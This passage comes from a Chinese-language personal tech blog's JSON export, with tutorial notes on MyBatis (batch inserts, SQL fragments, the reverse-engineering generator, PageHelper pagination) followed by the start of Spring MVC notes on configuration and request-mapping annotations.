insertMoreByList(@Param(\u0026#34;emps\u0026#34;) List\u0026lt;Emp\u0026gt; emps); List\u0026lt;Emp\u0026gt; emps = Arrays.asList(emp1, emp2, emp3); int result = mapper.insertMoreByList(emps); --\u0026gt; \u0026lt;insert id=\u0026#34;insertMoreByList\u0026#34;\u0026gt; insert into t_emp values \u0026lt;foreach collection=\u0026#34;emps\u0026#34; item=\u0026#34;emp\u0026#34; separator=\u0026#34;,\u0026#34;\u0026gt; (null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email},null) \u0026lt;/foreach\u0026gt; \u0026lt;/insert\u0026gt; 8.6 sql 片段 sql片段，可以记录一段公共sql片段，在使用的地方通过include标签进行引入 声明sql片段：\u0026lt;sql\u0026gt;标签 1 \u0026lt;sql id=\u0026#34;empColumns\u0026#34;\u0026gt;eid,emp_name,age,sex,email\u0026lt;/sql\u0026gt; 引用sql片段：\u0026lt;include\u0026gt;标签 1 2 3 4 \u0026lt;!--List\u0026lt;Emp\u0026gt; getEmpByCondition(Emp emp);--\u0026gt; \u0026lt;select id=\u0026#34;getEmpByCondition\u0026#34; resultType=\u0026#34;Emp\u0026#34;\u0026gt; select \u0026lt;include refid=\u0026#34;empColumns\u0026#34;\u0026gt;\u0026lt;/include\u0026gt; from t_emp \u0026lt;/select\u0026gt; 9 MyBatis的逆向工程 正向工程：先创建Java实体类，由框架负责根据实体类生成数据库表。Hibernate是支持正向工程的\n逆向工程：先创建数据库表，由框架负责根据数据库表，反向生成如下资源：\nJava实体类\nMapper接口 Mapper映射文件 添加依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;dependencies\u0026gt; \u0026lt;!-- MyBatis核心依赖包 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- junit测试 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.13.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- log4j日志 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.17\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;!-- 控制Maven在构建过程中相关配置 --\u0026gt; \u0026lt;build\u0026gt; \u0026lt;!-- 构建过程中用到的插件 --\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.0\u0026lt;/version\u0026gt; \u0026lt;!-- 插件的依赖 --\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- 逆向工程的核心依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 数据库连接池 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.mchange\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;c3p0\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; 创建逆向工程的配置文件\n文件名必须是：generatorConfig.xml 这里是mac下的路径，windows需要额外修改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;!-- targetRuntime: 执行生成的逆向工程的版本 MyBatis3Simple: 生成基本的CRUD（清新简洁版） MyBatis3: 生成带条件的CRUD（奢华尊享版） --\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;!-- 数据库的连接信息 --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;amp;useSSL=false\u0026amp;amp;serverTimezone=UTC\u0026amp;amp;rewriteBatchedStatements=true\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;/jdbcConnection\u0026gt; \u0026lt;!-- javaBean的生成策略--\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;com.reus.mybatis.pojo\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- SQL映射文件的生成策略 --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/resources\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- Mapper接口的生成策略 --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- 逆向分析的表 --\u0026gt; \u0026lt;!-- tableName设置为*号，可以对应所有表，此时不写domainObjectName --\u0026gt; \u0026lt;!-- domainObjectName属性指定生成出来的实体类的类名 --\u0026gt; \u0026lt;table tableName=\u0026#34;t_emp\u0026#34; domainObjectName=\u0026#34;Emp\u0026#34;/\u0026gt; \u0026lt;table tableName=\u0026#34;t_dept\u0026#34; domainObjectName=\u0026#34;Dept\u0026#34;/\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; 运行结果\n10 配置分页插件 pom.xml添加依赖\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在MyBatis的核心配置文件（mybatis-config.xml）中配置插件\n1 2 3 4 \u0026lt;plugins\u0026gt; \u0026lt;!--设置分页插件--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; 使用\n在查询功能之前使用PageHelper.startPage(int pageNum, int pageSize)开启分页功能 pageNum：当前页的页码 pageSize：每页显示的条数 1 2 3 4 5 6 EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); //访问第一页，每页四条数据 PageHelper.startPage(1,4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); emps.forEach(System.out::println); } 在查询获取list集合之后，使用PageInfo\u0026lt;T\u0026gt; pageInfo = new PageInfo\u0026lt;\u0026gt;(List\u0026lt;T\u0026gt; list, intnavigatePages)获取分页相关数据\nlist：分页之后的数据 navigatePages：导航分页的页码数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void testPageHelper() throws IOException { InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); SqlSession sqlSession = sqlSessionFactory.openSession(true); EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); PageHelper.startPage(1, 4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); PageInfo\u0026lt;Emp\u0026gt; page = new PageInfo\u0026lt;\u0026gt;(emps,5); System.out.println(page); } 结果：\n1 2 3 4 5 PageInfo{ pageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, list=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false} [Emp{eid=1, empName=\u0026#39;admin\u0026#39;, age=22, sex=\u0026#39;男\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=2, empName=\u0026#39;admin2\u0026#39;, age=22, sex=\u0026#39;男\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=3, empName=\u0026#39;王五\u0026#39;, age=12, sex=\u0026#39;女\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=3}, Emp{eid=4, empName=\u0026#39;赵六\u0026#39;, age=32, sex=\u0026#39;男\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=1}], prePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]} 常用数据 pageNum：当前页的页码 pageSize：每页显示的条数 size：当前页显示的真实条数 total：总记录数 pages：总页数 prePage：上一页的页码 nextPage：下一页的页码 isFirstPage/isLastPage：是否为第一页/最后一页 hasPreviousPage/hasNextPage：是否存在上一页/下一页 navigatePages：导航分页的页码数 navigatepageNums：导航分页的页码，[1,2,3,4,5] ","permalink":"http://www.reus09.top/posts/tech/mybatis/","summary":"MyBatis 这里整理了MyBatis的常见用法 Mybatis 主要对数据库的操作提供了组件 1 环境搭建 导入依赖 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatis核心 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;","title":"Mybatis"},{"content":"Spring-mvc 本篇主要对spring-mvc的知识点进行总结\nMVC的工作流程：\n用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，Controller调用相应的Model层处理请求，处理完毕将结果返回到Controller，Controller再根据请求处理的结果找到相应的View视图，渲染数据后最终响应给浏览器 SpringMVC工作流程\n浏览器发送请求，若请求地址符合前端控制器的url-pattern，该请求就会被前端控制器DispatcherServlet处理。 前端控制器会读取SpringMVC的核心配置文件，通过扫描组件找到控制器，将请求地址和控制器中@RequestMapping注解的value属性值进行匹配 若匹配成功，该注解所标识的控制器方法就是处理请求的方法。处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过Thymeleaf对视图进行渲染，最终转发到视图所对应页面 转发和重定向区别\nforward（转发）：\n是服务器请求资源,服务器直接访问目标地址的URL,把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,因为这个跳转过程实在服务器实现的，并不是在客户端实现的所以客户端并不知道这个跳转动作，所以它的地址栏还是原来的地址.\nredirect（重定向）：\n是服务端根据逻辑,发送一个状态码,告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL.\n转发是服务器行为，重定向是客户端行为。\n1 配置环境 相关依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在web.xml里面配置springMVC的组件，还有过滤器， 对SpringMVC的配置文件:web.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!--配置springMVC的编码过滤器--\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.CharacterEncodingFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;encoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;UTF-8\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;forceResponseEncoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;!-- contextConfigLocation为固定值 --\u0026gt; \u0026lt;param-name\u0026gt;contextConfigLocation\u0026lt;/param-name\u0026gt; \u0026lt;!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --\u0026gt; \u0026lt;param-value\u0026gt;classpath:springMVC.xml\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;!-- 作为框架的核心组件，在启动过程中有大量的初始化操作要做 而这些操作放在第一次请求时才执行会严重影响访问速度 因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时 --\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 设置springMVC的核心控制器所能处理的请求的请求路径 /所匹配的请求可以是/login或.html或.js或.css方式的请求路径 但是/不能匹配.jsp请求路径的请求 --\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 注：\n\u0026lt;url-pattern\u0026gt;标签中使用/和/*的区别：\n/所匹配的请求可以是/login或.html或.js或.css方式的请求路径，但是/不能匹配.jsp请求路径的请求\n因此就可以避免在访问jsp页面时，该请求被DispatcherServlet处理，从而找不到相应的页面\n/*则能够匹配所有请求，例如在使用过滤器时，若需要对所有请求进行过滤，就需要使用/*的写法\nspring-mvc.xml配置文件\n这里是以解析器为thymeleaf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xmlns:mvc=\u0026#34;http://www.springframework.org/schema/mvc\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\u0026#34;\u0026gt; \u0026lt;!-- 扫描组件--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.reus.springmvc\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;!-- 配置Thymeleaf视图解析器 --\u0026gt; \u0026lt;bean id=\u0026#34;viewResolver\u0026#34; class=\u0026#34;org.thymeleaf.spring5.view.ThymeleafViewResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;order\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateEngine\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.SpringTemplateEngine\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;templateResolver\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\u0026#34;\u0026gt; \u0026lt;!-- 视图前缀 --\u0026gt; \u0026lt;property name=\u0026#34;prefix\u0026#34; value=\u0026#34;/WEB-INF/templates/\u0026#34;/\u0026gt; \u0026lt;!-- 视图后缀 --\u0026gt; \u0026lt;property name=\u0026#34;suffix\u0026#34; value=\u0026#34;.html\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateMode\u0026#34; value=\u0026#34;HTML5\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- 配置视图控制器 --\u0026gt; \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; \u0026lt;!-- 开放对静态资源的访问--\u0026gt; \u0026lt;mvc:default-servlet-handler/\u0026gt; \u0026lt;!-- 开启 SpringMVC 的 注解驱动 比如RequestMapping --\u0026gt; \u0026lt;mvc:annotation-driven/\u0026gt; \u0026lt;!-- 配置 文件上传解析器 ，将上传的文件封装为MultipartFile--\u0026gt; \u0026lt;bean id= \u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; \u0026lt;!-- 配置拦截器 --\u0026gt; \u0026lt;mvc:interceptors\u0026gt; \u0026lt;!-- \u0026lt;bean class=\u0026#34;com.reus.springmvc.interceptors.FirstInterceptor\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:mapping path=\u0026#34;/*\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:exclude-mapping path=\u0026#34;/\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;ref bean=\u0026#34;secondInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;/mvc:interceptors\u0026gt; \u0026lt;!-- 配置 异常处理 --\u0026gt; \u0026lt;bean class=\u0026#34;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;exceptionMappings\u0026#34;\u0026gt; \u0026lt;props\u0026gt; \u0026lt;prop key=\u0026#34;java.lang.ArithmeticException\u0026#34;\u0026gt;error\u0026lt;/prop\u0026gt; \u0026lt;/props\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- 设置将异常信息共享在请求域中--\u0026gt; \u0026lt;property name=\u0026#34;exceptionAttribute\u0026#34; value=\u0026#34;ex\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2 SpringMVC中常用的标签 2.1 @RequestingMapping RequestingMapping\n@RequestMapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。\n@RequestMapping注解的value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求 这个进入可以用在SpringMVC.xml里面用配置的方式代替。\n1 \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; 但是开启这个会导致其他标注的请求映射失效，因此需要开启mvc注解驱动 \u0026lt;mvc:annotation-driven /\u0026gt; @RequestMapping标识一个类：设置映射请求的请求路径的初始信息\n@RequestMapping标识一个方法：设置映射请求请求路径的具体信息\n1 2 3 4 5 6 7 8 9 10 @Controller @RequestMapping(\u0026#34;/test\u0026#34;) public class RequestMappingController { //此时请求映射所映射的请求的请求路径为：/test/testRequestMapping @RequestMapping(\u0026#34;/testRequestMapping\u0026#34;) public String testRequestMapping(){ return \u0026#34;success\u0026#34;; } } @RequestMapping注解的method属性通过请求的请求方式（get或post）匹配请求映射\n@RequestMapping注解的method属性是一个RequestMethod类型的数组，表示该请求映射能够匹配多种请求方式的请求\n若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错405：Request method 'POST' not supported\n@RequestMapping注解的params属性通过请求的请求参数匹配请求映射\n@RequestMapping注解的params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数和请求映射的匹配关系\n\u0026quot;param\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数 \u0026quot;!param\u0026quot;：要求请求映射所匹配的请求必须不能携带param请求参数 \u0026quot;param=value\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数且param=value \u0026quot;param!=value\u0026quot;：要求请求映射所匹配的请求必须携带param请求参数但是param!=value SpringMVC支持ant风格的路径\n？：表示任意的单个字符\n*：表示任意的0个或多个字符\n**：表示任意的一层或多层目录\n只能使用/**/xxx的方式 RequestMapping占位符的作用\nSpringMVC路径中的占位符常用于RESTful风格中，当请求路径中将某些数据通过路径的方式传输到服务器中，就可以在相应的@RequestMapping注解的value属性中通过占位符{xxx}表示传输的数据，在通过@PathVariable注解，将占位符所表示的数据赋值给控制器方法的形参\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testRest/{id}/{username}\u0026#34;) public String testRest(@PathVariable(\u0026#34;id\u0026#34;) String id, @PathVariable(\u0026#34;username\u0026#34;) String username){ System.out.println(\u0026#34;id:\u0026#34;+id+\u0026#34;,username:\u0026#34;+username); return \u0026#34;success\u0026#34;; } //最终输出的内容为--\u0026gt;id:1,username:admin 2.2 @RequestParam @RequestParam是将请求参数和控制器方法的形参创建映射关系 @RequestParam注解一共有三个属性： value：指定为形参赋值的请求参数的参数名 required：设置是否必须传输此请求参数，默认值为true 若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数，且没有设置defaultValue属性，则页面报错400：Required String parameter 'xxx' is not present；若设置为false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为null defaultValue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为\u0026quot;\u0026ldquo;时，则使用默认值为形参赋值 作用实际就是指定需要传入的参数并获取。 2.3 @RequestHeader @RequestHeader是将请求头信息和控制器方法的形参创建映射关系 @RequestHeader注解一共有三个属性：value、required、defaultValue，用法同@RequestParam 获取请求头的信息 2.4 @CookieValue @CookieValue是将cookie数据和控制器方法的形参创建映射关系 @CookieValue注解一共有三个属性：value、required、defaultValue，用法同@RequestParam 作用为获取cookie的信息。 2.5@RequestBody @RequestBody可以获取请求体，需要在控制器方法设置一个形参，使用@RequestBody进行标识，当前请求的请求体就会为当前注解所标识的形参赋值\n即获取传输过来的请求体部分 1 2 3 4 5 6 // 比如传输的 username=admin password=123456 @RequestMapping(\u0026#34;/testRequestBody\u0026#34;) public String testRequestBody(@RequestBody String requestBody){ System.out.println(\u0026#34;requestBody:\u0026#34;+requestBody); return \u0026#34;success\u0026#34;; } 则输出结果为：requestBody:username=admin\u0026amp;password=123456 RequestEntity封装请求报文的一种类型，需要在控制器方法的形参中设置该类型的形参，当前请求的请求报文就会赋值给该形参，可以通过getHeaders()获取请求头信息，通过getBody()获取请求体信息\n1 2 requestHeader:[host:\u0026#34;localhost:8080\u0026#34;, connection:\u0026#34;keep-alive\u0026#34;, content-length:\u0026#34;27\u0026#34;, cache-control:\u0026#34;max-age=0\u0026#34;, sec-ch-ua:\u0026#34;\u0026#34; Not A;Brand\u0026#34;;v=\u0026#34;99\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;90\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;90\u0026#34;\u0026#34;, sec-ch-ua-mobile:\u0026#34;?0\u0026#34;, upgrade-insecure-requests:\u0026#34;1\u0026#34;, origin:\u0026#34;http://localhost:8080\u0026#34;, user-agent:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026#34;] requestBody:username=admin\u0026amp;password=123 2.6@ResponseBody @ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器\n1 2 3 4 5 @RequestMapping(\u0026#34;/testResponseBody\u0026#34;) @ResponseBody public String testResponseBody(){ return \u0026#34;success\u0026#34;; } 结果：浏览器页面显示字符串success 2.7@RestController @RestController注解是springMVC提供的一个复合注解，标识在控制器的类上，就相当于为类添加了@Controller注解，并且为其中的每个方法添加了@ResponseBody注解 3 SpirngMVC获取参数 ServletAPI获取:request.getParameter(\u0026quot;xx\u0026quot;);\n1 2 3 4 5 6 7 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(HttpServletRequest request){ String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } 通过控制器方法的形参获取请求参数\n在控制器方法的形参位置，设置和请求参数同名的形参，当浏览器发送请求，匹配到请求映射时，在DispatcherServlet中就会将请求参数赋值给相应的形参\n1 \u0026lt;a th:href=\u0026#34;@{/testParam(username=\u0026#39;admin\u0026#39;,password=123456)}\u0026#34;\u0026gt;测试获取请求参数--\u0026gt;/testParam\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; 1 2 3 4 5 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(String username, String password){ System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } 